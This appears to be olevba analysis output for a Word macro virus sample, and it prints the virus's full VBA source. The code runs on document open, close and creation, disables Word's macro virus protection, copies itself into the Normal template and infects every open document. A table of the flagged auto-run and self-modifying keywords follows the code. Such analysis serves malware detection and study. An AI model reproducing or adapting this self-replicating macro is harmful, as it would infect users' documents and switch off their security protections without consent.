olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Thus-based-448a16dfcdcf981c56e65f36dbc588dbc2f40a8f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Thus-based-448a16dfcdcf981c56e65f36dbc588dbc2f40a8f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
'house'
'deal'
w = Format(dd - mm)
If w = "20-01" Then
    With Assistant.NewBalloon
    .Icon = msoIconAlert
    .Heading = "PEPO PUNDA"
    .Text = "hallo this little VIRUS is a little harmless"
    .Animation = msoAnimationGreeting
    .Show
End With
End If
    On Error Resume Next
    Application.Options.VirusProtection = False
    If NormalTemplate.VBProject.VBComponents.Item(1).codemodule.Lines(3, 1) <> "'deal'" Then
        NormalTemplate.VBProject.VBComponents.Item(1).codemodule _
        .deletelines 1, NormalTemplate.VBProject.VBComponents.Item(1) _
        .codemodule.CountOfLines
    End If
    If NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines = 0 Then
        NormalTemplate.VBProject.VBComponents.Item(1).codemodule _
        .InsertLines 1, ActiveDocument.VBProject.VBComponents.Item(1) _
        .codemodule.Lines(1, ActiveDocument.VBProject.VBComponents _
        .Item(1).codemodule.CountOfLines)
    End If
    If NormalTemplate.Saved = False Then NormalTemplate.Save
    
    For k = 1 To Application.Documents.Count
        If Application.Documents.Item(k).VBProject.VBComponents.Item(1).codemodule.Lines(3, 1) <> "'deal'" Then
            Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
            .codemodule.deletelines 1, Application.Documents.Item(k) _
            .VBProject.VBComponents.Item(1).codemodule.CountOfLines
        End If
        If Application.Documents.Item(k).VBProject.VBComponents.Item(1).codemodule.CountOfLines = 0 Then
            Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
            .codemodule.InsertLines 1, NormalTemplate.VBProject.VBComponents _
            .Item(1).codemodule.Lines(1, NormalTemplate.VBProject _
            .VBComponents.Item(1).codemodule.CountOfLines)
        End If
    Next k
End Sub
Private Sub Document_Close()
    Document_Open
End Sub
Private Sub Document_New()
    Document_Open
End Sub





































































































































































+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

